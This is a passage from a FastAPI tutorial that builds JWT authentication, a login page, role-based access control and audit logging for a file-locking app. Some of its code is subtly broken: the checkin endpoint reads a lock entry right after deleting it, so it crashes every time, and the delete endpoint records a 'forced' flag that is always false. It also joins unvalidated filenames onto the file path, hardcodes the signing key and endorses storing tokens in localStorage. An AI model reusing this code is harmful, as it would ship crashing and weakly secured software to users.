## 5.6: Implementing JWT Authentication

### Configuration and Setup

Add to `main.py`:

```python
from datetime import datetime, timedelta, timezone
from jose import JWTError, jwt
from fastapi import Depends, HTTPException, status
from fastapi.security import OAuth2PasswordBearer, OAuth2PasswordRequestForm
from pydantic import BaseModel

# ============================================
# JWT CONFIGURATION
# ============================================

# SECRET_KEY: Used to sign JWTs
# CRITICAL: Keep this secret! Never commit to git!
# In production: Use environment variable
SECRET_KEY = "your-secret-key-change-this-in-production-use-env-var"
ALGORITHM = "HS256"
ACCESS_TOKEN_EXPIRE_MINUTES = 30

# OAuth2 scheme (tells FastAPI where to find the token)
oauth2_scheme = OAuth2PasswordBearer(tokenUrl="api/auth/login")

# ============================================
# PYDANTIC MODELS
# ============================================

class Token(BaseModel):
    access_token: str
    token_type: str

class TokenData(BaseModel):
    username: str
    role: str

class User(BaseModel):
    username: str
    full_name: str
    role: str

# ============================================
# JWT FUNCTIONS
# ============================================

def create_access_token(data: dict, expires_delta: timedelta = None):
    """
    Create a JWT access token.

    Args:
        data: Dictionary to encode (usually username, role)
        expires_delta: How long until token expires

    Returns:
        Encoded JWT string
    """
    to_encode = data.copy()

    # Set expiration time
    if expires_delta:
        expire = datetime.now(timezone.utc) + expires_delta
    else:
        expire = datetime.now(timezone.utc) + timedelta(minutes=15)

    to_encode.update({"exp": expire})

    # Encode the JWT
    encoded_jwt = jwt.encode(to_encode, SECRET_KEY, algorithm=ALGORITHM)

    logger.info(f"Created JWT for data: {data}")
    return encoded_jwt

def decode_access_token(token: str) -> TokenData:
    """
    Decode and verify a JWT token.

    Args:
        token: The JWT string

    Returns:
        TokenData with username and role

    Raises:
        HTTPException if token is invalid or expired
    """
    credentials_exception = HTTPException(
        status_code=status.HTTP_401_UNAUTHORIZED,
        detail="Could not validate credentials",
        headers={"WWW-Authenticate": "Bearer"},
    )

    try:
        # Decode the JWT
        payload = jwt.decode(token, SECRET_KEY, algorithms=[ALGORITHM])

        # Extract username
        username: str = payload.get("sub")
        if username is None:
            raise credentials_exception

        # Extract role
        role: str = payload.get("role")
        if role is None:
            raise credentials_exception

        token_data = TokenData(username=username, role=role)

    except JWTError as e:
        logger.error(f"JWT decode error: {e}")
        raise credentials_exception

    return token_data
```

### Understanding the Code

**`OAuth2PasswordBearer`**

```python
oauth2_scheme = OAuth2PasswordBearer(tokenUrl="api/auth/login")
```

- Tells FastAPI: "Tokens come from the `Authorization` header"
- `tokenUrl` - Where to get the token (for API docs)
- Creates a dependency we'll use in endpoints

**JWT Encoding**

```python
encoded_jwt = jwt.encode(to_encode, SECRET_KEY, algorithm=ALGORITHM)
```

**What happens:**

1. Serializes `to_encode` dict to JSON
2. Base64-encodes the JSON
3. Creates signature using `SECRET_KEY` and `ALGORITHM`
4. Combines header + payload + signature with `.`

**JWT Decoding**

```python
payload = jwt.decode(token, SECRET_KEY, algorithms=[ALGORITHM])
```

**What happens:**

1. Splits token on `.` into parts
2. Re-computes signature using `SECRET_KEY`
3. Compares computed signature with token's signature
4. If match: signature is valid, return payload
5. If no match: token was tampered with, raise error
6. If expired: `exp` claim is past, raise error

---

## 5.7: Login Endpoint

### Create the Login Route

Add to `main.py`:

```python
@app.post("/api/auth/login", response_model=Token)
def login(form_data: OAuth2PasswordRequestForm = Depends()):
    """
    Login endpoint - authenticates user and returns JWT.

    OAuth2PasswordRequestForm provides:
        - username: str
        - password: str
    """
    logger.info(f"Login attempt for user: {form_data.username}")

    # Authenticate user
    user = authenticate_user(form_data.username, form_data.password)

    if not user:
        raise HTTPException(
            status_code=status.HTTP_401_UNAUTHORIZED,
            detail="Incorrect username or password",
            headers={"WWW-Authenticate": "Bearer"},
        )

    # Create JWT
    access_token_expires = timedelta(minutes=ACCESS_TOKEN_EXPIRE_MINUTES)
    access_token = create_access_token(
        data={"sub": user["username"], "role": user["role"]},
        expires_delta=access_token_expires
    )

    logger.info(f"Login successful for user: {user['username']}")

    return {
        "access_token": access_token,
        "token_type": "bearer"
    }
```

### Understanding OAuth2PasswordRequestForm

**What is it?**

- FastAPI dependency
- Parses form data (not JSON!)
- Used for OAuth2 password flow

**Why form data?**

- OAuth2 specification requires it
- Compatible with standard OAuth2 clients
- FastAPI's `/docs` can use it

**Request format:**

```
POST /api/auth/login
Content-Type: application/x-www-form-urlencoded

username=john&password=password123
```

**NOT JSON:**

```json
{ "username": "john", "password": "password123" }
```

### Test the Login Endpoint

**Using curl:**

```bash
curl -X POST http://127.0.0.1:8000/api/auth/login \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=john&password=password123"
```

**Response:**

```json
{
  "access_token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
  "token_type": "bearer"
}
```

**Using FastAPI docs:**

1. Go to `http://127.0.0.1:8000/docs`
2. Find `POST /api/auth/login`
3. Click "Try it out"
4. Enter username: `john`, password: `password123`
5. Click "Execute"

---

## 5.8: Protected Endpoints - Requiring Authentication

### Create Dependency for Current User

Add to `main.py`:

```python
async def get_current_user(token: str = Depends(oauth2_scheme)) -> User:
    """
    Dependency to get the current authenticated user.

    Usage:
        @app.get("/protected")
        def protected_route(current_user: User = Depends(get_current_user)):
            # current_user is automatically verified
    """
    # Decode and verify token
    token_data = decode_access_token(token)

    # Get user from database
    user = get_user(token_data.username)
    if user is None:
        raise HTTPException(
            status_code=status.HTTP_401_UNAUTHORIZED,
            detail="User not found",
        )

    # Return as Pydantic model (excludes password_hash)
    return User(
        username=user["username"],
        full_name=user["full_name"],
        role=user["role"]
    )
```

### Protect the Files Endpoint

Update your existing endpoint:

```python
@app.get("/api/files")
def get_files(current_user: User = Depends(get_current_user)):
    """
    Get all files - now requires authentication.
    """
    logger.info(f"Files requested by: {current_user.username}")

    if not REPO_PATH.exists():
        raise HTTPException(status_code=500, detail="Repository not found")

    locks = load_locks()
    all_items = os.listdir(REPO_PATH)
    files = []

    for filename in all_items:
        full_path = REPO_PATH / filename

        if full_path.is_file() and filename.endswith('.mcam'):
            if filename in locks:
                lock_info = locks[filename]
                status_val = "checked_out"
                locked_by = lock_info["user"]
            else:
                status_val = "available"
                locked_by = None

            files.append({
                "name": filename,
                "status": status_val,
                "size": full_path.stat().st_size,
                "locked_by": locked_by
            })

    return {"files": files}
```

### Test Protected Endpoint

**Without token (should fail):**

```bash
curl http://127.0.0.1:8000/api/files
```

**Response:**

```json
{ "detail": "Not authenticated" }
```

**With token (should succeed):**

```bash
# First, get token
TOKEN=$(curl -X POST http://127.0.0.1:8000/api/auth/login \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=john&password=password123" \
  | jq -r '.access_token')

# Use token
curl http://127.0.0.1:8000/api/files \
  -H "Authorization: Bearer $TOKEN"
```

**Now you get the files!**

---

## 5.9: Frontend Login Page

### Create Login HTML

Create `backend/static/login.html`:

```html
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>PDM - Login</title>
    <link rel="stylesheet" href="/static/css/style.css" />
  </head>
  <body class="login-page">
    <div class="login-container">
      <div class="login-card">
        <h1>PDM System</h1>
        <p class="subtitle">Parts Data Management</p>

        <form id="login-form">
          <div class="form-group">
            <label for="username">Username:</label>
            <input
              type="text"
              id="username"
              name="username"
              required
              autocomplete="username"
              autofocus
            />
          </div>

          <div class="form-group">
            <label for="password">Password:</label>
            <input
              type="password"
              id="password"
              name="password"
              required
              autocomplete="current-password"
            />
          </div>

          <button type="submit" class="btn btn-primary btn-block">
            Log In
          </button>

          <div id="login-error" class="error-message hidden"></div>
        </form>

        <div class="login-info">
          <p><strong>Test Accounts:</strong></p>
          <p>
            Admin: username=<code>admin</code>, password=<code>admin123</code>
          </p>
          <p>
            User: username=<code>john</code>, password=<code>password123</code>
          </p>
        </div>
      </div>
    </div>

    <script src="/static/js/login.js"></script>
  </body>
</html>
```

### Login Page CSS

Add to `style.css`:

```css
/* ============================================
   LOGIN PAGE
   ============================================ */

.login-page {
  background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
  min-height: 100vh;
  display: flex;
  align-items: center;
  justify-content: center;
}

.login-container {
  width: 100%;
  max-width: 400px;
  padding: 2rem;
}

.login-card {
  background: white;
  padding: 3rem 2rem;
  border-radius: 12px;
  box-shadow: 0 10px 40px rgba(0, 0, 0, 0.3);
}

.login-card h1 {
  text-align: center;
  color: #667eea;
  margin-bottom: 0.5rem;
}

.subtitle {
  text-align: center;
  color: #666;
  margin-bottom: 2rem;
}

.btn-primary {
  background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
  width: 100%;
}

.btn-block {
  width: 100%;
  margin-top: 1rem;
}

.error-message {
  margin-top: 1rem;
  padding: 0.75rem;
  background: #f8d7da;
  color: #721c24;
  border: 1px solid #f5c6cb;
  border-radius: 4px;
}

.error-message.hidden {
  display: none;
}

.login-info {
  margin-top: 2rem;
  padding: 1rem;
  background: #f8f9fa;
  border-radius: 4px;
  font-size: 0.9rem;
}

.login-info code {
  background: #e9ecef;
  padding: 0.2rem 0.4rem;
  border-radius: 3px;
  font-family: "Courier New", monospace;
}
```

### Login JavaScript

Create `backend/static/js/login.js`:

```javascript
document.addEventListener("DOMContentLoaded", function () {
  // Check if already logged in
  const token = localStorage.getItem("access_token");
  if (token) {
    // Already logged in, redirect to main app
    window.location.href = "/";
    return;
  }

  // Handle login form
  const loginForm = document.getElementById("login-form");
  const errorDiv = document.getElementById("login-error");

  loginForm.addEventListener("submit", async (e) => {
    e.preventDefault();

    const username = document.getElementById("username").value;
    const password = document.getElementById("password").value;

    // Hide previous errors
    errorDiv.classList.add("hidden");

    try {
      // Create form data (OAuth2 requires form format, not JSON)
      const formData = new URLSearchParams();
      formData.append("username", username);
      formData.append("password", password);

      const response = await fetch("/api/auth/login", {
        method: "POST",
        headers: {
          "Content-Type": "application/x-www-form-urlencoded",
        },
        body: formData,
      });

      if (!response.ok) {
        const error = await response.json();
        throw new Error(error.detail || "Login failed");
      }

      const data = await response.json();

      // Store token in localStorage
      localStorage.setItem("access_token", data.access_token);
      localStorage.setItem("token_type", data.token_type);

      // Redirect to main app
      window.location.href = "/";
    } catch (error) {
      console.error("Login error:", error);
      errorDiv.textContent = error.message;
      errorDiv.classList.remove("hidden");
    }
  });
});
```

### Understanding localStorage

**What is localStorage?**

- Browser API for storing data
- Persists even after browser closes
- Scoped to origin (domain + protocol)
- ~5-10MB storage limit
- Synchronous API (blocking)

**Methods:**

```javascript
// Store
localStorage.setItem("key", "value");

// Retrieve
const value = localStorage.getItem("key");

// Remove
localStorage.removeItem("key");

// Clear all
localStorage.clear();
```

**Security consideration:**

- Accessible by JavaScript (vulnerable to XSS)
- NOT secure storage for highly sensitive data
- Good for JWTs (which are signed, not encrypted)
- Alternative: `httpOnly` cookies (more secure, harder to use)

---

## 5.10: Protecting the Main App

### Update index.html to Check Auth

Modify `backend/static/index.html` - add this script at the TOP (before app.js):

```html
<script>
  // Check authentication before loading app
  (function () {
    const token = localStorage.getItem("access_token");
    if (!token) {
      // Not logged in, redirect to login
      window.location.href = "/login";
    }
  })();
</script>
```

### Update app.js to Include Token

Modify `loadFiles()` in `app.js`:

```javascript
async function loadFiles() {
  console.log("Loading files from API...");

  const loadingEl = document.getElementById("loading-indicator");
  const fileListEl = document.getElementById("file-list");

  loadingEl.classList.remove("hidden");
  fileListEl.classList.add("hidden");

  try {
    // Get token from localStorage
    const token = localStorage.getItem("access_token");

    const response = await fetch("/api/files", {
      headers: {
        Authorization: `Bearer ${token}`,
      },
    });

    // Check for authentication error
    if (response.status === 401) {
      // Token expired or invalid
      localStorage.removeItem("access_token");
      window.location.href = "/login";
      return;
    }

    if (!response.ok) {
      throw new Error(`HTTP error! status: ${response.status}`);
    }

    const data = await response.json();
    allFiles = data.files;

    displayFilteredFiles();
  } catch (error) {
    console.error("Error loading files:", error);
    displayError("Failed to load files. Please refresh the page.");
  } finally {
    loadingEl.classList.add("hidden");
    fileListEl.classList.remove("hidden");
  }
}
```

### Add Logout Button

Add to `index.html` header:

```html
<header>
  <div class="header-content">
    <div>
      <h1>PDM System</h1>
      <p>Parts Data Management</p>
    </div>
    <button id="logout-btn" class="btn btn-secondary">Logout</button>
  </div>
</header>
```

### Header CSS

```css
.header-content {
  display: flex;
  justify-content: space-between;
  align-items: center;
  max-width: 1200px;
  margin: 0 auto;
}
```

### Logout Handler

Add to `app.js` (in DOMContentLoaded):

```javascript
// Logout button
document.getElementById("logout-btn").addEventListener("click", () => {
  localStorage.removeItem("access_token");
  localStorage.removeItem("token_type");
  window.location.href = "/login";
});
```

### Update FastAPI to Serve Login Page

Add to `main.py`:

```python
@app.get("/login")
def serve_login():
    """Serve the login page."""
    return FileResponse("static/login.html")
```

---

## Stage 5 Complete - Your App is Secure!

### What You Built

You now have:

- Secure password hashing with bcrypt
- JWT-based authentication
- Login/logout functionality
- Protected API endpoints
- Session management in frontend
- User database with roles
- Token expiration handling

### Key Security Concepts Mastered

**Password Security:**

- Never store plain text passwords
- Bcrypt hashing with salts
- Timing attack protection
- Cost factor for brute-force defense

**JWT Authentication:**

- Token structure (header.payload.signature)
- Signing and verification
- Stateless authentication
- Token expiration

**Frontend Security:**

- Token storage in localStorage
- Authorization headers
- Redirect on authentication failure
- Secure logout

### Verification Checklist

- [ ] Cannot access main app without login
- [ ] Login with correct credentials works
- [ ] Login with wrong credentials fails
- [ ] Token is sent with API requests
- [ ] Expired/invalid token redirects to login
- [ ] Logout clears token
- [ ] Passwords are hashed in users.json
- [ ] Understand JWT structure
- [ ] Understand authentication flow

### What's Next?

In **Stage 6**, we'll implement **Role-Based Access Control (RBAC)**:

- Admin-only endpoints (delete files, manage users)
- User permissions (only owner can checkin)
- UI elements that change based on role
- Audit logging for sensitive actions

Your app is now authenticated. Next, we add authorization.

---

# Stage 6: Role-Based Access Control (RBAC) - Authorization Deep Dive

## Introduction: The Goal of This Stage

You have authentication (users can log in), but everyone has the same permissions. An admin and a regular user can do exactly the same things. This is a security problem.

In this stage, you'll implement **authorization** - controlling what authenticated users can do based on their role.

By the end of this stage, you will:

- Understand RBAC theory and design patterns
- Implement role-based endpoint protection
- Create admin-only features (delete files, manage users)
- Enforce ownership rules (only lock owner can checkin)
- Build role-aware UI (admins see different buttons)
- Implement audit logging for sensitive actions
- Apply the Principle of Least Privilege
- Handle permission errors gracefully

**Time Investment:** 5-7 hours

---

## 6.1: Authorization Theory - The Access Control Matrix

### The Three Questions of Authorization

After authentication answers "Who are you?", authorization must answer three questions:

1. **What** is the user trying to do? (action: read, write, delete)
2. **Who** is trying to do it? (user identity and role)
3. **Is this allowed?** (permission check against rules)

### The Access Control Matrix

Imagine a spreadsheet:

|                 | File1                  | File2                  | User Management     | System Settings |
| --------------- | ---------------------- | ---------------------- | ------------------- | --------------- |
| **admin**       | Read, Write, Delete    | Read, Write, Delete    | Read, Write, Delete | Read, Write     |
| **john (user)** | Read, Write (if owner) | Read                   | None                | None            |
| **jane (user)** | Read                   | Read, Write (if owner) | None                | None            |

**This matrix defines every permission in the system.**

### RBAC - Simplifying the Matrix

**The Problem:** If you have 1,000 users and 10,000 files, your matrix has 10 million cells. Unmanageable.

**The Solution:** Role-Based Access Control (RBAC)

Instead of assigning permissions to individual users, you assign them to **roles**:

```
Roles:
  admin:
    - can_delete_any_file
    - can_manage_users
    - can_force_checkin
    - can_view_audit_logs

  user:
    - can_checkout_file
    - can_checkin_own_file
    - can_view_files
```

Then assign roles to users:

```
john → user role
admin → admin role
```

**Benefits:**

- Add new user? Just assign a role (instant permissions)
- Change permissions? Update the role (affects all users with that role)
- Scale to millions of users with only a handful of roles

### The Principle of Least Privilege

**Definition:** Every user should have the MINIMUM permissions needed to do their job, and nothing more.

**Example:**

- ❌ Give everyone admin access "just in case"
- ✓ Regular users can only checkout/checkin their own files
- ✓ Admins can override locks (for emergencies only)

**Why it matters:**

- Limits damage from compromised accounts
- Prevents accidental destructive actions
- Satisfies security compliance requirements

---

## 6.2: Implementing Role-Based Dependencies

### Create Role Checker Dependencies

Add to `main.py`:

```python
from typing import List
from fastapi import Depends, HTTPException, status

# ============================================
# ROLE-BASED DEPENDENCIES
# ============================================

def require_role(allowed_roles: List[str]):
    """
    Dependency factory for role-based access control.

    Usage:
        @app.delete("/api/admin/files/{filename}")
        def delete_file(
            filename: str,
            current_user: User = Depends(require_role(["admin"]))
        ):
            # Only admins can reach this code

    Args:
        allowed_roles: List of role names that can access the endpoint

    Returns:
        Dependency function that checks user role
    """
    async def role_checker(current_user: User = Depends(get_current_user)) -> User:
        if current_user.role not in allowed_roles:
            logger.warning(
                f"Access denied: {current_user.username} (role: {current_user.role}) "
                f"attempted to access endpoint requiring roles: {allowed_roles}"
            )
            raise HTTPException(
                status_code=status.HTTP_403_FORBIDDEN,
                detail=f"Access denied. Required role: {', '.join(allowed_roles)}"
            )
        return current_user

    return role_checker

# Convenience dependencies for common cases
require_admin = require_role(["admin"])
require_user = require_role(["admin", "user"])  # Any authenticated user
```

### Understanding Dependency Factories

**What's happening here?**

```python
def require_role(allowed_roles: List[str]):
    def role_checker(current_user: User = Depends(get_current_user)) -> User:
        # Check logic
        return current_user
    return role_checker
```

This is a **factory function** - a function that creates and returns another function.

**Step by step:**

1. You call `require_role(["admin"])`
2. This CREATES a new function `role_checker` with `allowed_roles = ["admin"]` captured in closure
3. Returns that function
4. FastAPI uses the returned function as a dependency

**Why this pattern?**

Without the factory, you'd need separate functions for every role combination:

```python
# BAD - lots of duplication
def require_admin(current_user: User = Depends(get_current_user)):
    if current_user.role != "admin":
        raise HTTPException(403)
    return current_user

def require_moderator(current_user: User = Depends(get_current_user)):
    if current_user.role != "moderator":
        raise HTTPException(403)
    return current_user

# ... etc for every role
```

With the factory:

```python
# GOOD - one function, infinite combinations
require_admin = require_role(["admin"])
require_moderator = require_role(["moderator"])
require_admin_or_mod = require_role(["admin", "moderator"])
```

### HTTP Status Codes - 401 vs 403

```python
# 401 Unauthorized
raise HTTPException(status_code=401, detail="Not authenticated")

# 403 Forbidden
raise HTTPException(status_code=403, detail="Access denied")
```

**The difference:**

- **401 Unauthorized** - "I don't know who you are" (missing/invalid token)
- **403 Forbidden** - "I know who you are, but you can't do this" (insufficient permissions)

**The confusion:**

- "Unauthorized" sounds like it should be 403
- HTTP spec is misleading here
- Think of 401 as "Unauthenticated" and 403 as "Unauthorized"

---

## 6.3: Admin-Only Delete Endpoint

### Implement File Deletion

Add to `main.py`:

```python
@app.delete("/api/admin/files/{filename}")
def delete_file(
    filename: str,
    current_user: User = Depends(require_admin)
):
    """
    Delete a file - ADMIN ONLY.

    This is a destructive operation and should be carefully controlled.
    """
    logger.warning(
        f"DELETE request for '{filename}' by admin: {current_user.username}"
    )

    file_path = REPO_PATH / filename

    # Check if file exists
    if not file_path.exists():
        raise HTTPException(
            status_code=404,
            detail=f"File '{filename}' not found"
        )

    # Check if file is locked (optional - admins can override)
    locks = load_locks()
    if filename in locks:
        lock_info = locks[filename]
        logger.warning(
            f"Deleting locked file '{filename}' (was locked by {lock_info['user']})"
        )
        # Remove the lock
        del locks[filename]
        save_locks(locks)

    # Delete the file
    try:
        os.remove(file_path)
        logger.info(f"File deleted: '{filename}' by {current_user.username}")

        # Log to audit trail (we'll implement this soon)
        log_audit_event(
            user=current_user.username,
            action="DELETE_FILE",
            target=filename,
            details={"forced": filename in locks}
        )

        return {
            "success": True,
            "message": f"File '{filename}' deleted successfully"
        }

    except Exception as e:
        logger.error(f"Error deleting file '{filename}': {e}")
        raise HTTPException(
            status_code=500,
            detail="Failed to delete file"
        )
```

### Understanding the Admin Override

```python
if filename in locks:
    logger.warning(f"Deleting locked file...")
    del locks[filename]
    save_locks(locks)
```

**Why allow deleting locked files?**

**Scenario:** A user locks a file and goes on vacation. The file needs to be deleted urgently (corrupted, wrong part number, etc.).

**Solution:** Admins can override locks, but:

- It's logged with `logger.warning()` (visible in logs)
- Recorded in audit trail
- Should be rare (only for emergencies)

**This is the Principle of Least Privilege in action:**

- Regular users: Cannot delete ANY files
- Admins: Can delete files, even locked ones
- But even admins actions are logged (accountability)

---

## 6.4: Ownership-Based Authorization

### The Problem

Current checkin logic:

```python
if lock_info["user"] != request.user:
    raise HTTPException(403, detail="File locked by someone else")
```

This works, but it's hardcoded in the endpoint. Let's formalize ownership checks.

### Create Ownership Checker

Add to `main.py`:

```python
def check_file_ownership(
    filename: str,
    current_user: User,
    allow_admin_override: bool = True
) -> bool:
    """
    Check if user owns the lock on a file.

    Args:
        filename: Name of the file
        current_user: The current user
        allow_admin_override: If True, admins always pass (default: True)

    Returns:
        True if user owns the file lock, False otherwise

    Raises:
        HTTPException if file is not locked or user doesn't own it
    """
    locks = load_locks()

    # Check if file is locked
    if filename not in locks:
        raise HTTPException(
            status_code=400,
            detail=f"File '{filename}' is not checked out"
        )

    lock_info = locks[filename]

    # Admin override
    if allow_admin_override and current_user.role == "admin":
        logger.info(
            f"Admin override: {current_user.username} accessing "
            f"file locked by {lock_info['user']}"
        )
        return True

    # Check ownership
    if lock_info["user"] != current_user.username:
        raise HTTPException(
            status_code=403,
            detail=f"File is locked by {lock_info['user']}, not {current_user.username}"
        )

    return True
```

### Update Checkin Endpoint

```python
@app.post("/api/files/checkin")
def checkin_file(
    request: CheckinRequest,
    current_user: User = Depends(get_current_user)
):
    """
    Checkin a file (release lock).
    User must own the lock, unless they're an admin.
    """
    logger.info(f"Checkin request: {request.filename} by {current_user.username}")

    # Verify ownership (admins can override)
    check_file_ownership(request.filename, current_user, allow_admin_override=True)

    # Load locks
    locks = load_locks()

    # Remove lock
    del locks[request.filename]
    save_locks(locks)

    logger.info(f"File checked in: {request.filename}")

    # Audit log
    log_audit_event(
        user=current_user.username,
        action="CHECKIN_FILE",
        target=request.filename,
        details={"forced": locks[request.filename]["user"] != current_user.username}
    )

    return {
        "success": True,
        "message": f"File '{request.filename}' checked in"
    }
```

### Understanding the Design

**Why separate `check_file_ownership()` from the endpoint?**

**Benefits:**

1. **Reusability** - Use the same check in multiple endpoints
2. **Testability** - Easy to unit test the permission logic
3. **Clarity** - Endpoint code focuses on business logic, not permission checks
4. **Maintainability** - Change permission rules in one place

**This is the Separation of Concerns principle:**

- Endpoint: Orchestrates the operation
- `check_file_ownership()`: Handles permission logic
- `load_locks()`, `save_locks()`: Handle data persistence

---

## 6.5: Audit Logging - Tracking Sensitive Actions

### Why Audit Logs?

**Security requirements:**

- Compliance (SOC2, ISO 27001, GDPR)
- Forensics (who did what when)
- Anomaly detection (unusual admin activity)
- Accountability (prevents abuse of power)

**What to log:**

- WHO (user)
- WHAT (action)
- WHEN (timestamp)
- WHERE (target resource)
- HOW (success/failure, details)

### Create Audit Log Structure

Create `backend/audit_log.json`:

```json
[]
```

### Implement Audit Functions

Add to `main.py`:

```python
import uuid
from datetime import datetime, timezone

AUDIT_LOG_FILE = BASE_DIR / 'audit_log.json'

# ============================================
# AUDIT LOGGING
# ============================================

def log_audit_event(
    user: str,
    action: str,
    target: str,
    details: dict = None,
    status: str = "SUCCESS"
):
    """
    Log a security-relevant event to the audit log.

    Args:
        user: Username who performed the action
        action: Action type (e.g., "DELETE_FILE", "FORCE_CHECKIN")
        target: What was acted upon (filename, username, etc.)
        details: Additional context
        status: "SUCCESS" or "FAILURE"
    """
    event = {
        "id": str(uuid.uuid4()),
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "user": user,
        "action": action,
        "target": target,
        "details": details or {},
        "status": status
    }

    # Load existing log
    if AUDIT_LOG_FILE.exists():
        try:
            with open(AUDIT_LOG_FILE, 'r') as f:
                log = json.load(f)
        except json.JSONDecodeError:
            log = []
    else:
        log = []

    # Append event
    log.append(event)

    # Save log
    try:
        with open(AUDIT_LOG_FILE, 'w') as f:
            json.dump(log, f, indent=2)
    except Exception as e:
        logger.error(f"Failed to write audit log: {e}")
        # Don't raise - audit logging failure shouldn't break the operation

    logger.info(f"AUDIT: {user} - {action} - {target} - {status}")

def get_audit_log(
    limit: int = 100,
    user: str = None,
    action: str = None
) -> List[dict]:
    """
    Retrieve audit log entries.

    Args:
        limit: Maximum number of entries to return
        user: Filter by username (optional)
        action: Filter by action type (optional)

    Returns:
        List of audit log entries (most recent first)
    """
    if not AUDIT_LOG_FILE.exists():
        return []

    try:
        with open(AUDIT_LOG_FILE, 'r') as f:
            log = json.load(f)
    except json.JSONDecodeError:
        return []

    # Apply filters
    if user:
        log = [e for e in log if e["user"] == user]

    if action:
        log = [e for e in log if e["action"] == action]

    # Sort by timestamp (most recent first)
    log.sort(key=lambda e: e["timestamp"], reverse=True)

    # Limit results
    return log[:limit]
```

### Admin Endpoint to View Audit Log

```python
@app.get("/api/admin/audit-log")
def get_audit_log_endpoint(
    limit: int = 100,
    user: str = None,
    action: str = None,
    current_user: User = Depends(require_admin)
):
    """
    Retrieve audit log - ADMIN ONLY.

    Query parameters:
        limit: Max entries to return (default 100)
        user: Filter by username
        action: Filter by action type
    """
    logger.info(f"Audit log accessed by: {current_user.username}")

    entries = get_audit_log(limit=limit, user=user, action=action)

    return {
        "total": len(entries),
        "entries": entries
    }
```

### Understanding Audit Log Design

**Why UUID for event ID?**

```python
"id": str(uuid.uuid4())
# Example: "f47ac10b-58cc-4372-a567-0e02b2c3d479"
```

- **Globally unique** (no collisions, even across systems)
- **No sequence information** (can't guess next ID)
- **Standard format** (compatible with databases, APIs)

**Why ISO 8601 timestamps?**

```python
"timestamp": datetime.now(timezone.utc).isoformat()
# Example: "2025-10-03T20:30:45.123456+00:00"
```

- **Sortable** (string comparison works correctly)
- **Unambiguous** (includes timezone)
- **Standard** (widely supported)
- **Human-readable** (unlike Unix timestamps)

**Why not raise on audit log failure?**

```python
try:
    # Write to audit log
except Exception as e:
    logger.error(f"Failed to write audit log: {e}")
    # Don't raise - keep going
```

**The reasoning:**

- If audit logging fails, you still want the operation to succeed
- Example: Deleting a file should work even if audit log is full
- But you DO log the error (so admins can fix the audit system)

**Alternative view:**

- Some high-security systems DO fail the operation if audit fails
- "If we can't prove what happened, don't let it happen"
- Trade-off between availability and auditability

---

## 6.6: Role-Aware Frontend

### Check User Role on Login

Update `login.js`:

```javascript
const data = await response.json();

// Store token
localStorage.setItem("access_token", data.access_token);
localStorage.setItem("token_type", data.token_type);

// Decode JWT to get user info (we'll add a helper for this)
const payload = parseJWT(data.access_token);
localStorage.setItem("username", payload.sub);
localStorage.setItem("user_role", payload.role);

// Redirect to main app
window.location.href = "/";
```

### JWT Parsing Helper

Add to `login.js` and `app.js`:

```javascript
/**
 * Parse a JWT token (decode payload).
 * WARNING: This does NOT verify the signature!
 * Only use for extracting public info (username, role).
 * Server MUST verify the token.
 */
function parseJWT(token) {
  try {
    const base64Url = token.split(".")[1];
    const base64 = base64Url.replace(/-/g, "+").replace(/_/g, "/");
    const jsonPayload = decodeURIComponent(
      atob(base64)
        .split("")
        .map((c) => "%" + ("00" + c.charCodeAt(0).toString(16)).slice(-2))
        .join("")
    );
    return JSON.parse(jsonPayload);
  } catch (e) {
    console.error("Failed to parse JWT:", e);
    return null;
  }
}
```

### Understanding JWT Parsing

**Why this complex decoding?**

```javascript
const base64Url = token.split('.')[1];  // Get payload part
const base64 = base64Url.replace(/-/g, '+').replace(/_/g, '/');  // URL-safe → standard Base64
const jsonPayload = decodeURIComponent(atob(base64)...);  // Base64 → UTF-8 JSON
return JSON.parse(jsonPayload);  // JSON → JavaScript object
```

**Base64URL vs Base64:**

- Standard Base64: Uses `+` and `/`
- Base64URL: Uses `-` and `_` (URL-safe)
- JWT uses Base64URL (can be in URLs without encoding)

**The `atob()` function:**

- "ASCII to Binary"
- Decodes Base64 string
- Built-in browser function

**Why `decodeURIComponent()`?**

- Handles UTF-8 characters correctly
- Without it, emojis and special characters break

**Security warning in the comment:**

- Parsing JWT in JavaScript does NOT verify it
- Anyone can decode a JWT (it's not encrypted!)
- Server MUST verify the signature
- Client-side parsing is ONLY for UI purposes

### Show/Hide Admin Features

Update `app.js`:

```javascript
// Get user role
const userRole = localStorage.getItem("user_role");
const isAdmin = userRole === "admin";

function createFileElement(file) {
  const div = document.createElement("div");
  div.className = "file-item";

  // ... file info section ...

  // Actions section
  const actionsDiv = document.createElement("div");
  actionsDiv.className = "file-actions";

  if (file.status === "available") {
    const checkoutBtn = document.createElement("button");
    checkoutBtn.className = "btn btn-checkout";
    checkoutBtn.textContent = "Checkout";
    checkoutBtn.onclick = () => handleCheckout(file.name);
    actionsDiv.appendChild(checkoutBtn);
  } else {
    const checkinBtn = document.createElement("button");
    checkinBtn.className = "btn btn-checkin";
    checkinBtn.textContent = "Checkin";
    checkinBtn.onclick = () => handleCheckin(file.name);
    actionsDiv.appendChild(checkinBtn);
  }

  // Admin-only delete button
  if (isAdmin) {
    const deleteBtn = document.createElement("button");
    deleteBtn.className = "btn btn-danger";
    deleteBtn.textContent = "Delete";
    deleteBtn.onclick = () => handleDelete(file.name);
    actionsDiv.appendChild(deleteBtn);
  }

  div.appendChild(infoDiv);
  div.appendChild(actionsDiv);

  return div;
}
```

### Delete Button CSS

Add to `style.css`:

```css
.btn-danger {
  background: #dc3545;
}

.btn-danger:hover {
  background: #c82333;
}
```

### Delete Handler

Add to `app.js`:

```javascript
async function handleDelete(filename) {
  // Double confirmation for destructive action
  if (!confirm(`Are you sure you want to DELETE "${filename}"?`)) {
    return;
  }

  if (!confirm("This action cannot be undone. Delete file?")) {
    return;
  }

  try {
    const token = localStorage.getItem("access_token");

    const response = await fetch(`/api/admin/files/${filename}`, {
      method: "DELETE",
      headers: {
        Authorization: `Bearer ${token}`,
      },
    });

    if (response.status === 403) {
      showNotification("Access denied. Admin privileges required.", "error");
      return;
    }

    if (response.ok) {
      showNotification(`File "${filename}" deleted successfully`, "success");
